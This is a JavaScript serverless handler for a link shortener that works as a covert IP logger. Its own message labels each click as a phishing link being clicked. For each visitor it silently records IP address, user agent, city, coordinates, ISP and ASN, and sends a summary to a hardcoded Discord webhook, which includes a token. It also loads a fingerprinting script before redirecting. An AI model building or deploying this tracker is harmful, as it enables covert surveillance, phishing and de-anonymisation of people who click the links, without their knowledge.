
import { db } from '../../store';

export async function onRequestGet(context) {
  const { request } = context;
  const url = new URL(request.url);
  const shortCode = url.pathname.split('/').pop().split('?')[0];
  const targetUrl = db.urls[shortCode];

  if (!targetUrl) {
    return new Response('Invalid link', { status: 404 });
  }

  const ip = request.headers.get('CF-Connecting-IP');
  const ua = request.headers.get('User-Agent');
  const geo = {
    city: request.cf?.city,
    region: request.cf?.region,
    country: request.cf?.country,
    latitude: request.cf?.latitude,
    longitude: request.cf?.longitude,
    timezone: request.cf?.timezone,
    asn: request.cf?.asn,
    org: request.cf?.asOrganization
  };

  const log = {
    timestamp: new Date().toISOString(),
    ip,
    ua,
    geo
  };

  db.logs[shortCode].push(log);

  const webhookUrl = 'https://discord.com/api/webhooks/1353930302141239347/1szsFFb63TCOnSse9laS87xVhHENhe_EyaHppyyJjxd6rFq_a_ddSuG9uF7na0eh5sEL';
  fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: `🕵️ 釣魚連結被點擊！\nIP: ${ip}\nUser-Agent: ${ua}\n地點: ${geo.city}, ${geo.region}, ${geo.country}`
    })
  }).catch(() => {});

  return new Response(`
    <html>
      <head><title>Redirecting...</title></head>
      <body>
        <script src="/track-fp.js"></script>
        <script>
          setTimeout(() => {
            window.location.href = "${targetUrl}";
          }, 1500);
        </script>
      </body>
    </html>
  `, {
    headers: { 'Content-Type': 'text/html' }
  });
}
